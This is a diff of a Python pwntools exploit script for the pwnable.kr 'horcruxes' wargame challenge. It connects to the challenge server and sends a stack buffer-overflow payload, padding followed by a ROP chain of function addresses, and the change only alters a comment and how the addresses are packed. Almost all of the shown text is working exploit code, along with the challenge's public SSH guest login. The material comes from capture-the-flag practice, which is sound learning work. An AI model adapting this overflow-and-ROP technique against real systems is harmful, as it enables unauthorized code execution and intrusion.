@@ -3,7 +3,7 @@ import re
 
 # shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
 # shell.download("/home/horcruxes/horcruxes", "./horcruxes")
-# io = shell.process('./horcruxes')  # too slow
+# io = shell.process('./horcruxes')
 io = remote('pwnable.kr', 9032)
 elf = ELF('./horcruxes')
 A_addr = elf.symbols['A']  # 0x809fe4b
@@ -25,7 +25,7 @@ call_ropme = 0x809fffc
 io.sendlineafter(b'Select Menu:', b'1')
 io.recvuntil(b'How many EXP did you earned? : ')
 padding = b'A'*(0x74+0x4)
-payload = padding + flat(A_addr, B_addr, C_addr, D_addr, E_addr, F_addr, G_addr, call_ropme)
+payload = padding + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(call_ropme)
 io.sendline(payload)
 sleep(2)
 msg = io.recv(1024).decode()
